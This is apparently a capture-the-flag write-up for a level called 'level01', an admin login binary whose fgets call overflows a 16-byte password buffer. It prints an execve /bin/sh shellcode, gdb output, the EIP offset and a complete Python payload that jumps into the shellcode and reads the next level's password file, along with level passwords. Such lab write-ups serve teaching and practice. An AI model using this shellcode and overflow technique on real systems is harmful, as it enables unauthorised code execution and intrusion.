# Level 01
*password : uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL*

## Analyze
```
scp -P 4242 level01@192.168.56.109:level01 binary/
```

- name = `dat_wil`
- `verify_user_name()` check only the 7 first characters

Interesting part :
```
char pass_input[16];
...
fgets(pass_input, 100, stdin);
```
**exploit** : `fgets` read 100 characters and store them in a buffer of size 16.\

## Buffer overflow : fgets exploit
**objective** : overflow pass_input to execute a shellcode

shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
- `pass_input` is too small for the shellcode, so let's use `use a_user_name`
```
(gdb) b verify_user_name
Breakpoint 1 at 0x8048469
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil

Breakpoint 1, 0x08048469 in verify_user_name ()
(gdb) x/x $eax
0x804a040 <a_user_name>:        0x5f746164
```
- address of `a_user_name + 7` : 0x0804a040 + 7 = 0x0804a047
- eip offset found : 80

```
$ python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n" + "x42" * 80 + "\x47\xa0\x04\x08"' > /tmp/level1 ; cat /tmp/level1 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```
